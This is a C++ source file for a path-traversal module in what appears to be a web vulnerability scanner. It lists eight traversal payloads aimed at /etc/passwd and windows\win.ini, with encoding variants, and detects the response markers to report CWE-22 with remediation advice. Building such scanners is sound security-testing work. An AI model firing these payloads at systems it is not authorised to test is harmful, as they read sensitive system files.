#include "../scanner_module.hpp"

#include <optional>
#include <regex>
#include <string>
#include <vector>

namespace aida {
namespace burp {
namespace scanner {

namespace {

std::vector<probe_t> traversal_probes(const insertion_point_t& ip, const module_context_t&)
{
    std::vector<probe_t> out;
    out.push_back({"../../../../etc/passwd",                           "root:", "unix-dotdot"});
    out.push_back({"..%2f..%2f..%2f..%2fetc%2fpasswd",                 "root:", "unix-pctencoded"});
    out.push_back({"..%252f..%252f..%252fetc%252fpasswd",              "root:", "unix-double-pct"});
    out.push_back({"....//....//....//etc/passwd",                     "root:", "unix-quad-dot"});
    out.push_back({"..\\..\\..\\..\\windows\\win.ini",                 "[fonts]", "win-backslash"});
    out.push_back({"..%5c..%5c..%5c..%5cwindows%5cwin.ini",            "[fonts]", "win-pctencoded"});
    out.push_back({"/etc/passwd",                                       "root:", "unix-absolute"});
    out.push_back({"c:\\windows\\win.ini",                              "[fonts]", "win-absolute"});
    (void)ip;
    return out;
}

std::optional<issue_t> traversal_detect(const insertion_point_t& ip, const probe_t& probe,
                                        const exchange_observed_t& resp, const module_context_t& ctx)
{
    if (probe.marker.empty()) return std::nullopt;
    if (!body_contains_ci(resp, probe.marker)) return std::nullopt;
    auto iss = make_issue("path-traversal.file-read", "Path Traversal / Local File Inclusion",
                          severity_t::high, confidence_t::firm, ip, probe, resp, ctx,
                          std::string("Sensitive file content marker observed: ") + probe.marker);
    iss.description = std::string("The parameter '") + ip.name +
        "' permitted path-traversal sequences and returned the contents of a sensitive OS file.";
    iss.remediation = "Resolve paths to a canonical form and verify they sit under an expected base directory; reject any traversal sequences before resolution.";
    iss.cwe.push_back("CWE-22");
    return iss;
}

bool register_self()
{
    module_t m;
    m.id = "path-traversal";
    m.name = "Path Traversal";
    m.category = "File Access";
    m.max_probes_per_point = 8;
    m.probes = traversal_probes;
    m.detect = traversal_detect;
    return register_module(std::move(m));
}

const bool s_registered = register_self();

}

}
}
}
